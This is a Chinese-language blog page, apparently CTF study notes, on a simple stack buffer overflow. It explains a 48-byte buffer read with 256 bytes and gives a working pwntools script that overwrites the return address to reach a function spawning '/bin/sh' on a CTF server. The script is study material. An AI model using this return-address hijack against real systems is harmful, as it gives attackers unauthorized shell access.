@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>简单栈溢出 - GuQing&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.jpg">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  <meta name="description" content="例子1234567891011int __fastcall main(int argc, const char **argv, const char **envp)&#123;  _BYTE buf[48]; &#x2F;&#x2F; [rsp+0h] [rbp-30h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  setvbuf(stder">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单栈溢出">
+<meta property="og:url" content="http://example.com/2025/12/27/%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="GuQing&#39;s Blog">
+<meta property="og:description" content="例子1234567891011int __fastcall main(int argc, const char **argv, const char **envp)&#123;  _BYTE buf[48]; &#x2F;&#x2F; [rsp+0h] [rbp-30h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  setvbuf(stder">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-27T10:09:14.888Z">
+<meta property="article:author" content="GuQing">
+<meta property="article:tag" content="Note_For_Pwn">
+<meta name="twitter:card" content="summary">
+
+  <link rel="preconnect" href="https://rsms.me/">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@15/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/carousel.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+
+  
+
+  
+<script src="/js/head.js"></script>
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+    data-nav-blur-gradient="false"
+    data-corner-squircle="true"
+  >
+    
+<script src="/js/body-top.js"></script>
+
+    <a href="#main-content" id="skip-to-content">跳至主要内容</a>
+    
+
+<nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">GuQing&#39;s Blog</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">主页</a>
+
+      
+      <a class="nav-item" href="/About-Me" style="--index: 1">关于我</a>
+      
+      <a class="nav-item" href="/archives" style="--index: 2">归档</a>
+      
+      <a class="nav-item" href="/tags" style="--index: 3">标签</a>
+      
+      <a class="nav-item" href="/categories" style="--index: 4">分类</a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 5"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content" data-pagefind-body>
+      
+<article class="post">
+  
+  <div class="meta">
+    
+    <div class="categories text-uppercase">
+    
+      <a href="/categories/Notes/">Notes</a>
+    
+    </div>
+    
+
+    
+    <time class="date" datetime="2025-12-27T00:00:00+08:00">
+      2025-12-27
+    </time>
+    
+
+    <h1 class="title" data-pagefind-meta="title">简单栈溢出</h1>
+  </div>
+
+  <div class="content">
+    <h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[48]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stderr, 0, 2, 0);</span><br><span class="line">  puts(&quot;Just say something...&quot;);</span><br><span class="line">  read(0, buf, 0x100u);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>read(0, buf, 0x100u)</code>出现了明显的栈溢出</p>
+<ul>
+<li>从标准输入（fd&#x3D;0）中读取 <strong>0x100 &#x3D; 256</strong> 字节到 <code>buf</code> 中。</li>
+<li>但是 <code>buf</code> 只有 48 字节！所以 <strong>直接构成栈缓冲区溢出漏洞</strong>。</li>
+</ul>
+<p>当有 <strong>溢出漏洞</strong>（比如 buffer overflow）时，程序允许我们“写太多数据”，覆盖重要区域，比如：</p>
+<ul>
+<li><strong>返回地址</strong></li>
+<li>**函数指针</li>
+<li><strong>vtable 指针</strong></li>
+<li><strong>结构体内的 sensitive 字段</strong><br>这样，我们可以：</li>
+<li><strong>控制程序执行跳转</strong></li>
+<li><strong>伪造结构体（如 FILE 结构体）</strong></li>
+<li><strong>泄露敏感信息</strong><br>这种攻击叫做：<blockquote>
+<p><strong>内存破坏类攻击（Memory Corruption）</strong></p>
+</blockquote>
+</li>
+</ul>
+<p>然后可以在ida找到相应函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int whhhat()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;good work!&quot;);</span><br><span class="line">  return execve(&quot;/bin/sh&quot;, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>地址在00000000004011F7</p>
+<p>然后就可以写脚本了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">38062</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x4011F7</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里填充0x38（56）个a，对应buf的48个和默认压栈的8个rbp<br><code>p64(x)</code> 是 <code>pwntools</code> 中的函数，用来把整数 <code>x</code> 编码成 8 字节（64 位）的小端（Little Endian）格式的二进制数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|---------------------| ← 高地址</span><br><span class="line">| return address      | ← call 指令压栈（CPU自动）</span><br><span class="line">|---------------------|</span><br><span class="line">| saved rbp           | ← push rbp 压栈（编译器插入）</span><br><span class="line">|---------------------|</span><br><span class="line">| local variables     | ← 局部变量，如 char buf[48]</span><br><span class="line">|---------------------| ← rbp 指向这里</span><br></pre></td></tr></table></figure>
+  </div>
+
+  
+  <div class="about" data-pagefind-ignore>
+    <h2>关于本文</h2>
+    <div class="details">
+      <p>由 GuQing 撰写，采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a> 许可协议。</p>
+    </div>
+    
+    <p class="tags">
+      <i class="bi bi-tags icon"></i>
+      
+      <a href="/tags/Note-For-Pwn/" class="tag">#Note_For_Pwn</a>
+      
+    </p>
+    
+    
+  </div>
+  
+
+  <div class="container post-prev-next" data-pagefind-ignore>
+    
+    <a href="/2025/12/30/ret2libc/" class="next">
+      <div class="text">
+        <p class="label">下一篇</p>
+        <h3 class="title">ret2libc</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2025/12/27/%E4%B8%8D%E8%83%BD%E7%94%A8cat%E5%92%8Csh%E6%8C%87%E4%BB%A4/" class="prev">
+      <div class="text">
+        <p class="label">上一篇</p>
+        <h3 class="title">不能用cat和sh指令</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">主页</a>
+        
+        <a href="/About-Me" class="item">关于我</a>
+        
+        <a href="/archives" class="item">归档</a>
+        
+        <a href="/tags" class="item">标签</a>
+        
+        <a href="/categories" class="item">分类</a>
+        
+        <a href="/search" class="item">搜索</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Related</h2>
+        
+        <a target="_blank" rel="noopener" href="https://hexo.io/" class="item">Hexo</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2025 GuQing<br>由 <a href="http://hexo.io/" target="_blank">Hexo</a> 驱动</span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>浅色</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>深色</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>自动</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
